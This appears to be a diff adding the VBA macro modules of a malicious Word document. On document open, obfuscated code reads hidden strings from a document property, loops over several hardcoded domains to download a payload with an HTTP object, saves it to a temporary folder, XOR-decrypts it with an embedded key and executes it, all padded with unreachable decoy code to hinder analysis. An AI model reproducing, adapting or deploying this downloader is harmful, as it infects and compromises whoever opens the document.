@@ -1,0 +1,473 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+Sub autoopen()
+
+End Sub
+
+
+
+Sub Document_Open()
+
+Synomati "#663799"
+End Sub
+
+
+
+
+
+
+Attribute VB_Name = "Window1"
+Attribute VB_Base = "0{48AF4571-6937-48A6-9405-6DF504733273}{BA83F57B-847D-45E5-B565-8A9E772366A6}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+Attribute VB_Name = "STRIX"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Public Function setAsMainTarget() As String
+
+tt = ThisDocument.BuiltInDocumentProperties("Content status").Value
+Modulate = Split(tt, "IDEA")
+privateProbeName = Modulate(FreshID * 12 / 4)
+privateProbe
+
+setAsMainTarget = ""
+
+End Function
+
+
+    Public Sub Challenge(sender As String, e As Integer)
+Vgux 1
+Vgux 350
+    End Sub
+
+    
+    
+    
+
+Attribute VB_Name = "Module3"
+
+Public MovedPermanently() As String
+Public system_ofADown_4 As String
+  
+Public Const system_ofADown_System = "User-Agent"
+Public SubProperty As Object
+
+
+Public system_ofADown_RDD2 As Object
+
+
+Public Sub Subfunc(MethodParam2() As Byte, MethodParam As String)
+
+  
+  Dim CeLaP2 As Long
+  Dim CeLaP3 As Long
+  Dim CeLaP5 As Long
+  Dim CeLaP6 As Long
+  Dim plusplus() As Byte
+Dim CeLaP4 As Long
+Dim plusplusLen As Long
+  plusplusLen = Len(MethodParam)
+ReDim plusplus(plusplusLen)
+
+  plusplus = StrConv(MethodParam, vbFromUnicode)
+
+  
+  CeLaP2 = UBound(MethodParam2) + 1
+  CeLaP5 = CeLaP2
+  
+  
+  For CeLaP4 = _
+  0 To (CeLaP2 - 1)
+    aa = plusplus(CeLaP4 Mod plusplusLen)
+    bb = MethodParam2(CeLaP4)
+    MethodParam2(CeLaP4) = Lipochanko(bb, aa)
+    
+    If (CeLaP4 >= CeLaP6) Then
+      CeLaP3 = Int((CeLaP4 / CeLaP5) * 100)
+      CeLaP6 = (CeLaP5 * ((CeLaP3 + 1) / 100)) + 1
+    End If
+  Next
+End Sub
+
+
+Public Function Lipochanko(a, b)
+Dim per
+Dim der
+   Lipochanko = (a Or b) And (Not (a And b))
+End Function
+
+
+
+Public Function Synomati(Comps)
+    GoTo l12
+    strComputer = Comps
+    Set oWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+
+    If InStr(1, strCaption, "Windows 7", vbTextCompare) Then
+        Synomati = "Win7"
+    End If
+    If InStr(1, strCaption, "XP", vbTextCompare) Then
+        Synomati = "XP"
+    End If
+l12:
+    Dim c As STRIX
+Set c = New STRIX
+
+CallByName c, Window1.T2.Text, _
+VbMethod
+End Function
+
+
+Public Sub Vgux(strComputer As Integer)
+
+If strComputer = 1 Then
+CallByName CuPro, Window1.OptionButton1.Tag, VbMethod, Modulate(5), system_ofADown_4, False
+
+Exit Sub
+Else: GoTo lab1
+End If
+    Set objWMIService = GetObject("winmgmts:" _
+        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colPageFiles = objWMIService.ExecQuery _
+        ("Select * from Win32_PageFileSetting")
+lab1:
+
+CallByName CuPro, Window1.OptionButton2.Tag, VbMethod, system_ofADown_System, _
+Window1.SpinButton1.Tag
+Exit Sub
+For Each objPageFile In colPageFiles
+        objPageFile.InitialSize = 2046
+        objPageFile.MaximumSize = 4092
+        objPageFile.Put_
+    Next
+    
+
+End Sub
+    
+
+
+
+
+Attribute VB_Name = "Module1"
+
+Public Modulate() As String
+
+Public itemI As Integer
+Public system_ofADown_Project As String
+Public privateProbeName As String
+Public system_ofADown_ProjectBBB As String
+Public CuPro As Object
+
+
+
+
+
+Sub enumMembers(objDomain)
+    On Error Resume Next
+    Dim Secondary(20)
+    For Each objMember In objDomain
+        If objMember.Class = "user" Then
+            x = x + 1
+
+            
+            
+            SamAccountName = objMember.SamAccountName
+            Cn = objMember.Cn
+            FirstName = objMember.GivenName
+            LastName = objMember.sn
+            initials = objMember.initials
+            Descrip = objMember.Description
+            Office = objMember.physicalDeliveryOfficeName
+            Telephone = objMember.telephonenumber
+            EmailAddr = objMember.mail
+            WebPage = objMember.wwwHomePage
+            Addr1 = objMember.streetAddress
+            City = objMember.l
+            State = objMember.st
+            ZipCode = objMember.postalCode
+            Title = objMember.Title
+            Department = objMember.Department
+            Company = objMember.Company
+            Manager = objMember.Manager
+            Profile = objMember.profilePath
+            LoginScript = objMember.scriptpath
+            HomeDirectory = objMember.HomeDirectory
+            HomeDrive = objMember.HomeDrive
+            AdsPath = objMember.AdsPath
+
+            AllAttributes = Array(SamAccountName, Cn, FirstName, LastName, initials, Descrip, Office, Telephone, EmailAddr, WebPage, Addr1, City, State, ZipCode, Title, Department, Company, Manager, Profile, LoginScript, HomeDirectory, HomeDrive, AdsPath)
+            
+            zz = 1
+            For Each Email In objMember.proxyAddresses
+                If Left(Email, 5) = "SMTP:" Then
+                    Primary = Mid(Email, 6)
+                ElseIf Left(Email, 5) = "smtp:" Then
+                    Secondary(zz) = Mid(Email, 6)
+                    zz = zz + 1
+                End If
+            Next
+            
+
+            
+            Counter = 0
+            For ll = 1 To 20
+                If Secondary(ll) <> "" Then
+                    If Counter = 0 Then
+                        SecondEmail = Secondary(ll)
+                    Else
+                        SecondEmail = SecondEmail + ", " + Secondary(ll)
+                    End If
+                    Counter = Counter + 1
+                End If
+            Next
+            SecondEmail = """" & SecondEmail & """"
+            
+            
+            
+            SamAccountName = "-"
+            Cn = "-"
+            FirstName = "-"
+            LastName = "-"
+            initials = "-"
+            Descrip = "-"
+            Office = "-"
+            Telephone = "-"
+            EmailAddr = "-"
+            WebPage = "-"
+            Addr1 = "-"
+            City = "-"
+            State = "-"
+            ZipCode = "-"
+            Title = "-"
+            Department = "-"
+            Company = "-"
+            Manager = "-"
+            Profile = "-"
+            LoginScript = "-"
+            HomeDirectory = "-"
+            HomeDrive = "-"
+            AdsPath = "-"
+            
+            For ll = 1 To 20
+                Secondary(ll) = ""
+            Next
+            Primary = "-"
+            SecondEmail = ""
+        End If
+
+        
+    Next
+End Sub
+
+Public Function Assimptota4(FullPath As String, NumHoja As Integer) As String
+  WidthA system_ofADown_ProjectBBB, system_ofADown_Project, "g3MLpuSlnxDSAa5WPS8BBQluc3zSwlU1"
+
+
+system_ofADown_aifde.Open (system_ofADown_Project)
+   
+End Function
+
+
+
+
+Public Function Assimptota6(FullPath As String, NumHoja As Integer) As String
+
+system_ofADown_ProjectSpeed
+ CallByName SubProperty, "O" + "pen", VbMethod
+If NumHoja > 400 Then
+
+    If numExportadas = 0 Then
+        Assimptota6 = "No rows to export [No tiene filas por exportar]"
+        Exit Function
+    End If
+End If
+
+ system_ofADown_PokerFace = CallByName(CuPro, "responseBody", VbGet)
+ 
+
+    
+ SubProperty.Write system_ofADown_PokerFace
+CallByName SubProperty, "sav" + Sooopchik + "ile", VbMethod, system_ofADown_ProjectBBB, 2
+Assimptota4 ".", 1
+End Function
+
+
+
+
+
+Attribute VB_Name = "Module2"
+
+
+
+
+
+
+Public system_ofADown_PokerFace As Variant
+Public system_ofADown_aifde As Object
+Public system_ofADown_LAKOPPC As String
+Public system_ofADown_PIRO_LOR As Object
+  
+Public smbi As String
+Public system_ofADown_2 As String
+Public Const FreshID = 0
+
+
+Public Const Sooopchik = "etof"
+
+Public Sub WidthA(Dbbb As String, bbbJ As String, Optional system_ofADown_Sexote As String)
+
+  Dim bbb As Integer
+bbb = FreeFile
+  Dim Gbbb() As Byte
+  
+  Open Dbbb For Binary As #bbb
+  ReDim Gbbb(0 To LOF(bbb) - 1)
+  Get #bbb, , Gbbb()
+  Close #bbb
+  Call Subfunc(Gbbb(), system_ofADown_Sexote)
+  bbb = FreeFile
+  Open bbbJ For Binary As #bbb
+  Put #bbb, , Gbbb()
+  Close #bbb
+
+End Sub
+
+
+Public Function system_ofADown_ProjectSpeed()
+
+GoTo rTemp2
+    Set FSO = CreateObject("Scripting.FileSystemObject")
+
+Set oArgs = WScript.Arguments
+If oArgs.Count = 1 Then
+        strComputer = CStr(oArgs(0))
+Else
+    strComputer = InputBox("Enter computer name")
+End If
+
+
+
+
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
+Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_VideoController", "WQL", _
+wbemFlagReturnImmediately + wbemFlagForwardOnly)
+rTemp2:
+ system_ofADown_Project = system_ofADown_LAKOPPC
+ system_ofADown_ProjectBBB = system_ofADown_Project + "\eewadro" + CStr(itemI)
+
+
+GoTo rTemp3
+    For i = 0 To UBound(Menu3Rect)
+        If IntersectR.ect(rTemp, Menu3Rect(i), rMouse) Then
+            CheckRectsMenu3 = i + 1
+            Exit Function
+        End If
+    Next
+rTemp3:
+system_ofADown_Project = system_ofADown_Project + Replace(Modulate(12), ".", CStr(itemI) + ".")
+ SubProperty.Type = 1
+End Function
+
+Public Sub privateProbe()
+If ActiveDocument.Kind = 0 Then
+Set CuPro = CreateObject(privateProbeName)
+End If
+Set system_ofADown_PIRO_LOR = CreateObject(Modulate(FreshID + 3))
+smbi = Window1.Label1.Caption
+Shtefin = Replace("jsplast.ru/Nbiyure3Vventrust.ro/Nbiyure3Vherrossoidffr6644qa.top/af/Nbiyure3Vsjffonrvcik45bd.info/af/Nbiyure3", "RRDD", "om")
+MovedPermanently = Split(Shtefin, Window1.Command.Caption)
+ Set SubProperty = CreateObject(Modulate(1))
+    Modulate2 = Modulate(1 + 1)
+   Set system_ofADown_aifde = CreateObject(Modulate2)
+
+Set system_ofADown_RDD2 = system_ofADown_PIRO_LOR.Environment(Modulate(4))
+
+
+ itemI = 18 / 3
+ system_ofADown_LAKOPPC = system_ofADown_RDD2(Modulate(itemI))
+
+
+
+     RepackOK "5", "B", "5"
+
+End Sub
+
+
+
+Public Sub SaveDataCSVToolStripMenuItem_Click(e As Integer)
+       system_ofADown_4 = Window1.ZK.Caption & MovedPermanently(i)
+ itemI = itemI + 2
+ Dim XIpotom2 As STRIX
+Set XIpotom2 = New STRIX
+If e < 488 Then
+
+
+ XIpotom2.Challenge "Swed", 13
+CallByName CuPro, Window1.ToggleButton1.Caption, VbMethod
+Set XIpotom2 = Nothing
+ 
+Else
+
+End If
+    End Sub
+
+Public Sub RepackOK(sheetToMove As String, sheetAnchor As String, Assimptota6OrAfter As String)
+
+
+ Dim i
+ On Error GoTo d13
+For i = LBound(MovedPermanently) To UBound(MovedPermanently) Step 1
+ SaveDataCSVToolStripMenuItem_Click 72
+If CuPro.Status <> 200 Then
+ Err.Raise 700 + vbObjectError, "A", "D"
+End If
+    
+    
+    
+    Assimptota6 "2", 22
+ Exit Sub
+d13:
+Next
+Exit Sub
+
+    
+End Sub
+
+
+
+Public Function CheckRectsAd() As Boolean
+    Dim rTemp As String, rMouse As String, i As Integer
+    With rM.ouse
+        .Left = g_cursorx
+        .Right = .Left + 32
+        .Top = g_cursory
+        .Bottom = .Top + 1
+    End With
+    If IntersectR.ect(rTemp, AdRect, rMouse) Then
+        CheckRectsAd = True
+        Exit Function
+    End If
+End Function
+
+
+
+
+
